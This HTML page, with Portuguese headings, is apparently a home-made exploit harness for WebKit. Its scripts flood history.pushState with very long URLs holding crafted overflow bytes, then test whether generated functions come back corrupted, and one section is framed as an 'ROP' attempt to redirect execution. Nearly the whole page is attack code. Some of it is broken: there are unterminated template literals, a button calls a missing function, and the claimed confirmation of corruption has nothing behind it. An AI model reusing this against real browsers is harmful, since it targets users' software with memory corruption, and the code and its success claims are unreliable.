<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit Function Corruption Exploit (6-3-1)</title>
</head>
<body>

<h1>WebKit Function Corruption Exploit</h1>

<h2>DESCOBERTA: FUNÇÕES SÃO CORROMPIDAS!</h2>
<p><strong>Teste 9 mostrou:</strong> 20 funções retornando NaN (corrupção confirmada!)</p>
<p><strong>Estratégia:</strong> Usar sequência 6→3→1 + focar em funções</p>

<hr>

<h2>Teste A: Sequência 6→3→1 com Funções</h2>
<p>Replica sequência que funcionou + detecção de funções</p>
<button onclick="testA_Sequence631()">Executar Teste A</button>

<hr>

<h2>Teste B: Corrupção de Funções Conservadora</h2>
<p>Overflow menor para evitar crash, foco em funções</p>
<label>Overflow size:</label>
<input type="number" id="tbSize" value="20000" min="5000" max="50000">
<button onclick="testB_Conservative()">Executar Teste B</button>

<hr>

<h2>Teste C: Funções + Detecção de NaN</h2>
<p>Cria funções que retornam valores conhecidos, detecta NaN</p>
<label>Quantidade de funções:</label>
<input type="number" id="tcCount" value="50" min="10" max="200">
<button onclick="testC_NaNDetection()">Executar Teste C</button>

<hr>

<h2>Teste D: Overflow Incremental com Funções</h2>
<p>Aumenta overflow gradualmente até detectar corrupção</p>
<label>Start size:</label>
<input type="number" id="tdStart" value="10000" min="5000" max="30000">
<label>Step:</label>
<input type="number" id="tdStep" value="2000" min="500" max="5000">
<button onclick="testD_Incremental()">Executar Teste D</button>

<hr>

<h2>Teste E: Múltiplas Tentativas (Loop)</h2>
<p>Repete exploit múltiplas vezes para capturar corrupção</p>
<label>Iterações:</label>
<input type="number" id="teIter" value="10" min="3" max="30">
<button onclick="testE_Loop()">Executar Teste E</button>

<hr>

<h2>Teste F: Análise Detalhada de Corrupção</h2>
<p>Analisa exatamente COMO as funções foram corrompidas</p>
<button onclick="testF_DetailedAnalysis()">Executar Teste F</button>

<hr>

<h2>Teste G: Exploração com ROP Gadgets</h2>
<p>Tenta redirecionar execução usando funções corrompidas</p>
<button onclick="testG_ROPAttempt()">Executar Teste G</button>

<hr>

<h2>Teste H: Sweet Spot Finder</h2>
<p>Busca tamanho exato que corrompe SEM crash</p>
<button onclick="testH_SweetSpot()">Executar Teste H</button>

<hr>

<button onclick="clearLog()">Limpar Log</button>

<hr>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let functionTargets = [];
let corruptionHistory = [];

function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    corruptionHistory = [];
    log('Sistema reiniciado');
}

// ===================================================================
// CRIAR FUNÇÕES ALVO
// ===================================================================
function createFunctionTargets(count) {
    functionTargets = [];
    
    for (let i = 0; i < count; i++) {
        const expectedReturn = 0x90000000 + i;
        const func = new Function('', `return 0x${expectedReturn.toString(16)};`);
        
        functionTargets.push({
            id: i,
            func: func,
            expected: expectedReturn,
            name: `func_${i}`
        });
    }
    
    log(`${functionTargets.length} funções criadas`);
    return functionTargets;
}

// ===================================================================
// VERIFICAR CORRUPÇÃO DE FUNÇÕES
// ===================================================================
function checkFunctionCorruption() {
    let corrupted = 0;
    let nanCount = 0;
    let wrongValue = 0;
    let crashed = 0;
    let details = [];
    
    for (let i = 0; i < functionTargets.length; i++) {
        const t = functionTargets[i];
        
        try {
            const result = t.func();
            
            if (isNaN(result)) {
                nanCount++;
                corrupted++;
                details.push(`Func ${i}: NaN (esperado 0x${t.expected.toString(16)})`);
            } else if (result !== t.expected) {
                wrongValue++;
                corrupted++;
                details.push(`Func ${i}: 0x${result.toString(16)} != 0x${t.expected.toString(16)}`);
            }
        } catch (e) {
            crashed++;
            corrupted++;
            details.push(`Func ${i}: CRASH - ${e.message}`);
        }
    }
    
    return {
        total: corrupted,
        nan: nanCount,
        wrong: wrongValue,
        crashed: crashed,
        details: details
    };
}

// ===================================================================
// SIMULAR TESTE 6 (INCREMENTAL)
// ===================================================================
async function simulateTest6() {
    log('Simulando Teste 6 (Incremental)...');
    
    for (let i = 0; i < 5; i++) {
        const size = 1000 + (i * 5000);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < size; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            history.pushState({}, `t6_${i}`, "/" + base + overflow);
            log(`  T6-${i+1}: ${size} bytes OK`);
        } catch (e) {
            log(`  T6-${i+1}: FAIL - ${e.message}`);
            break;
        }
        await new Promise(r => setTimeout(r, 300));
    }
}

// ===================================================================
// SIMULAR TESTE 3 (SEQUÊNCIAS)
// ===================================================================
async function simulateTest3() {
    log('Simulando Teste 3 (Sequências)...');
    
    const sequences = [
        [0x00, 0x00, 0x00, 0x00],
        [0x0A, 0x0A, 0x0A, 0x0A],
        [0x01, 0x02, 0x03, 0x04, 0x05]
    ];
    
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq) {
                    overflow += String.fromCharCode(byte);
                }
            }
            history.pushState({}, `t3_${seq[0]}`, "/" + base + overflow);
            log(`  T3: [${seq.map(b => '0x'+b.toString(16).padStart(2,'0')).join(',')}] OK`);
        } catch (e) {
            log(`  T3: FAIL - ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 200));
    }
}

// ===================================================================
// TESTE A: SEQUÊNCIA 6→3→1 COM FUNÇÕES
// ===================================================================
async function testA_Sequence631() {
    log('================================');
    log('TESTE A: SEQUÊNCIA 6→3→1 COM FUNÇÕES');
    log('================================');
    
    clearLog();
    
    // Criar funções ANTES
    createFunctionTargets(50);
    
    log('');
    log('[FASE 1] Executando Teste 6 simulado...');
    await simulateTest6();
    
    log('');
    log('[FASE 2] Executando Teste 3 simulado...');
    await simulateTest3();
    
    log('');
    log('[FASE 3] Executando Teste 1 modificado (overflow de funções)...');
    
    try {
        const base = "A".repeat(BASE_SAFE);
        let overflow = "";
        
        // Overflow conservador
        for (let i = 0; i < 25000; i++) {
            overflow += String.fromCharCode(i % 33);
        }
        
        log(`Payload: ${overflow.length} bytes`);
        log('Executando...');
        
        history.pushState({}, "t1_func", "/" + base + overflow);
        
        log('Overflow executado!');
        
        setTimeout(() => {
            log('');
            log('=== VERIFICAÇÃO DE FUNÇÕES ===');
            
            const result = checkFunctionCorruption();
            
            log(`Total corrompido: ${result.total}/${functionTargets.length}`);
            log(`  NaN: ${result.nan}`);
            log(`  Valor errado: ${result.wrong}`);
            log(`  Crash: ${result.crashed}`);
            
            if (result.total > 0) {
                log('');
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
                log('CORRUPÇÃO DETECTADA!');
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
                
                log('');
                log('Detalhes (primeiros 10):');
                for (let detail of result.details.slice(0, 10)) {
                    log(`  ${detail}`);
                }
                
                corruptionHistory.push({
                    test: 'A',
                    size: 25000,
                    corrupted: result.total
                });
            } else {
                log('');
                log('Nenhuma corrupção detectada');
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE B: CONSERVADOR
// ===================================================================
async function testB_Conservative() {
    log('================================');
    log('TESTE B: OVERFLOW CONSERVADOR');
    log('================================');
    
    createFunctionTargets(30);
    
    // Pressão leve
    log('Aplicando pressão leve...');
    for (let i = 0; i < 3; i++) {
        try {
            history.pushState({}, `pre_${i}`, "/" + "A".repeat(BASE_SAFE) + "\x01".repeat(3000 * (i+1)));
            log(`  Pressão ${i+1}: OK`);
        } catch (e) {
            log(`  Pressão ${i+1}: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 200));
    }
    
    const size = parseInt(document.getElementById('tbSize').value);
    log('');
    log(`Executando overflow de ${size} bytes...`);
    
    try {
        const base = "A".repeat(BASE_SAFE);
        let overflow = "";
        for (let i = 0; i < size; i++) {
            overflow += String.fromCharCode(i % 33);
        }
        
        history.pushState({}, "conservative", "/" + base + overflow);
        
        log('Overflow executado!');
        
        setTimeout(() => {
            const result = checkFunctionCorruption();
            
            log('');
            log(`Corrupções: ${result.total} (NaN: ${result.nan}, Wrong: ${result.wrong}, Crash: ${result.crashed})`);
            
            if (result.total > 0) {
                log('SUCESSO!');
                for (let detail of result.details.slice(0, 5)) {
                    log(`  ${detail}`);
                }
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE C: DETECÇÃO DE NaN
// ===================================================================
async function testC_NaNDetection() {
    log('================================');
    log('TESTE C: DETECÇÃO ESPECÍFICA DE NaN');
    log('================================');
    
    const count = parseInt(document.getElementById('tcCount').value);
    createFunctionTargets(count);
    
    log('Verificando funções ANTES do overflow...');
    let preBroken = 0;
    for (let t of functionTargets.slice(0, 10)) {
        try {
            const r = t.func();
            if (isNaN(r)) preBroken++;
        } catch (e) {
            preBroken++;
        }
    }
    log(`  ${preBroken}/${10} já quebradas (deve ser 0)`);
    
    // Pressão
    log('');
    log('Aplicando pressão...');
    for (let i = 0; i < 5; i++) {
        try {
            history.pushState({}, `p_${i}`, "/" + "A".repeat(BASE_SAFE) + "\x01".repeat(5000 * (i+1)));
        } catch (e) {}
        await new Promise(r => setTimeout(r, 200));
    }
    
    log('');
    log('Executando overflow...');
    
    try {
        const base = "A".repeat(BASE_SAFE);
        let overflow = "";
        for (let i = 0; i < 30000; i++) {
            overflow += String.fromCharCode(i % 33);
        }
        
        history.pushState({}, "nan_detect", "/" + base + overflow);
        
        log('Overflow OK!');
        
        setTimeout(() => {
            log('');
            log('Verificando funções DEPOIS do overflow...');
            
            let nanFound = 0;
            let normalFound = 0;
            let crashFound = 0;
            
            for (let i = 0; i < functionTargets.length; i++) {
                const t = functionTargets[i];
                try {
                    const result = t.func();
                    if (isNaN(result)) {
                        nanFound++;
                        if (i < 10) {
                            log(`  Func ${i}: NaN (era 0x${t.expected.toString(16)})`);
                        }
                    } else if (result === t.expected) {
                        normalFound++;
                    } else {
                        log(`  Func ${i}: valor inesperado 0x${result.toString(16)}`);
                    }
                } catch (e) {
                    crashFound++;
                    if (i < 10) {
                        log(`  Func ${i}: crash`);
                    }
                }
            }
            
            log('');
            log(`=== RESULTADO ===`);
            log(`NaN: ${nanFound}/${functionTargets.length}`);
            log(`Normais: ${normalFound}/${functionTargets.length}`);
            log(`Crashes: ${crashFound}/${functionTargets.length}`);
            
            const corrupted = nanFound + crashFound;
            if (corrupted > 0) {
                log('');
                log(`CORRUPÇÃO: ${corrupted} funções afetadas!`);
                
                corruptionHistory.push({
                    test: 'C',
                    size: 30000,
                    corrupted: corrupted
                });
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE D: INCREMENTAL
// ===================================================================
async function testD_Incremental() {
    log('================================');
    log('TESTE D: INCREMENTAL COM FUNÇÕES');
    log('================================');
    
    createFunctionTargets(40);
    
    const start = parseInt(document.getElementById('tdStart').value);
    const step = parseInt(document.getElementById('tdStep').value);
    
    log(`Começando em ${start} bytes, incremento de ${step}`);
    log('');
    
    let currentSize = start;
    let bestCorruption = 0;
    let bestSize = 0;
    
    for (let i = 0; i < 8; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes...`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            history.pushState({}, `inc_${i}`, "/" + base + overflow);
            
            log(`  Overflow OK`);
            
            await new Promise(r => setTimeout(r, 800));
            
            const result = checkFunctionCorruption();
            log(`  Corrupções: ${result.total} (NaN: ${result.nan})`);
            
            if (result.total > bestCorruption) {
                bestCorruption = result.total;
                bestSize = currentSize;
                log(`  >>> NOVO MELHOR: ${bestCorruption} corrupções`);
            }
            
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 700));
            
        } catch (e) {
            log(`  CRASH: ${e.message}`);
            break;
        }
    }
    
    log('');
    log(`=== MELHOR RESULTADO ===`);
    log(`Tamanho: ${bestSize} bytes`);
    log(`Corrupções: ${bestCorruption}`);
    
    if (bestCorruption > 0) {
        corruptionHistory.push({
            test: 'D',
            size: bestSize,
            corrupted: bestCorruption
        });
    }
}

// ===================================================================
// TESTE E: LOOP
// ===================================================================
async function testE_Loop() {
    log('================================');
    log('TESTE E: MÚLTIPLAS TENTATIVAS');
    log('================================');
    
    const iterations = parseInt(document.getElementById('teIter').value);
    log(`Executando ${iterations} iterações...`);
    log('');
    
    let successCount = 0;
    let totalCorruptions = 0;
    
    for (let iter = 0; iter < iterations; iter++) {
        log(`[Iteração ${iter+1}/${iterations}]`);
        
        createFunctionTargets(30);
        
        // Pressão aleatória
        const pressure = Math.floor(Math.random() * 3) + 2;
        for (let i = 0; i < pressure; i++) {
            try {
                history.pushState({}, `l${iter}_p${i}`, "/" + "A".repeat(BASE_SAFE) + "\x01".repeat(4000 * (i+1)));
            } catch (e) {}
            await new Promise(r => setTimeout(r, 100));
        }
        
        // Overflow com tamanho variado
        const size = 20000 + Math.floor(Math.random() * 15000);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < size; i++) {
                overflow += String.fromCharCode(i % 33);
            }
            
            history.pushState({}, `loop_${iter}`, "/" + base + overflow);
            
            await new Promise(r => setTimeout(r, 500));
            
            const result = checkFunctionCorruption();
            
            if (result.total > 0) {
                successCount++;
                totalCorruptions += result.total;
                log(`  SUCCESS: ${result.total} corrupções (size: ${size})`);
            } else {
                log(`  Sem corrupção (size: ${size})`);
            }
            
        } catch (e) {
            log(`  CRASH (size: ${size})`);
        }
        
        await new Promise(r => setTimeout(r, 300));
    }
    
    log('');
    log(`=== ESTATÍSTICAS ===`);
    log(`Sucessos: ${successCount}/${iterations}`);
    log(`Total de corrupções: ${totalCorruptions}`);
    log(`Média: ${(totalCorruptions/Math.max(successCount,1)).toFixed(1)} por sucesso`);
}

// ===================================================================
// TESTE F: ANÁLISE DETALHADA
// ===================================================================
async function testF_DetailedAnalysis() {
    log('================================');
    log('TESTE F: ANÁLISE DETALHADA');
    log('================================');
    
    createFunctionTargets(50);
    
    log('Capturando estado inicial...');
    const initial = [];
    for (let t of functionTargets) {
        try {
            initial.push({
                id: t.id,
                result: t.func(),
                type: typeof t.func(),
                string: t.func.toString().substring(0, 50)
            });
        } catch (e) {
            initial.push({
                id: t.id,
                result: null,
                type: 'error',
                string: e.message
            });
        }
    }
    
    log(`  ${initial.length} funções capturadas`);
    
    // Pressão
    log('');
    for (let i = 0; i < 5; i++) {
        try {
            history.pushState({}, `fa_${i}`, "/" + "A".repeat(BASE_SAFE) + "\x01".repeat(5000 * (i+1)));
        } catch (e) {}
        await new Promise(r => setTimeout(r, 200));
    }
    
    log('Executando overflow...');
    
    try {
        const base = "A".repeat(BASE_SAFE);
        let overflow = "";
        for (let i = 0; i < 35000; i++) {
            overflow += String.fromCharCode(i % 33);
        }
        
        history.pushState({}, "analysis", "/" + base + overflow);
        
        log('Overflow OK!');
        
        setTimeout(() => {
            log('');
            log('Analisando mudanças...');
            
            for (let i = 0; i < Math.min(20, functionTargets.length); i++) {
                const init = initial[i];
                const t = functionTargets[i];
                
                try {
                    const newResult = t.func();
                    const newType = typeof t.func();
                    
                    if (newResult !== init.result) {
                        log(`');
                        log(`Func ${i}:`);
                        log(`  Antes: ${init.result} (${init.type})`);
                        log(`  Depois: ${newResult} (${newType})`);
                        
                        if (isNaN(newResult) && !isNaN(init.result)) {
                            log(`  >>> CORROMPIDO PARA NaN`);
                        }
                    }
                } catch (e) {
                    log(`');
                    log(`Func ${i}: agora crasha - ${e.message}`);
                }
            }
            
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE G: ROP ATTEMPT
// ===================================================================
async function testG_ROPAttempt() {
    log('================================');
    log('TESTE G: TENTATIVA DE ROP');
    log('================================');
    
    log('Criando funções com comportamento específico...');
    
    functionTargets = [];
    
    // Funções que fazem coisas específicas
    for (let i = 0; i < 20; i++) {
        const func = new Function('x', `
            if (typeof x === 'undefined') return 0x${(0xA0000000 + i).toString(16)};
            return x + ${i};
        `);
        
        functionTargets.push({
            id: i,
            func: func,
            expected: func()
        });
    }
    
    log(`${functionTargets.length} funções ROP criadas`);
    
    // Pressão
    log('');
    for (let i = 0; i < 5; i++) {
        try {
            history.pushState({}, `rop_p${i}`, "/" + "A".repeat(BASE_SAFE) + "\x01".repeat(6000 * (i+1)));
        } catch (e) {}
        await new Promise(r => setTimeout(r, 200));
    }
    
    log('Executando overflow com tentativa de ROP...');
    
    try {
        const base = "A".repeat(BASE_SAFE);
        let overflow = "";
        
        // Tentar injetar "ROP gadgets" (valores específicos)
        for (let i = 0; i < 30000; i++) {
            if (i % 1000 === 0) {
                // Injetar "ponteiro" (simulado)
                overflow += "\x10\x20\x00\x01"; // Valores específicos
            } else {
                overflow += String.fromCharCode(i % 33);
            }
        }
        
        history.pushState({}, "rop", "/" + base + overflow);
        
        log('Overflow executado!');
        
        setTimeout(() => {
            log('');
            log('Testando redirecionamento...');
            
            for (let i = 0; i < functionTargets.length; i++) {
                const t = functionTargets[i];
                try {
                    const result = t.func(100);
                    log(`  Func ${i}: ${result} (esperado: ${100 + i})`);
                    
                    if (result !== 100 + i && result !== t.expected) {
                        log(`    >>> COMPORTAMENTO ALTERADO!`);
                    }
                } catch (e) {
                    log(`  Func ${i}: ${e.message}`);
                }
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}
</script>
</body>
</html>
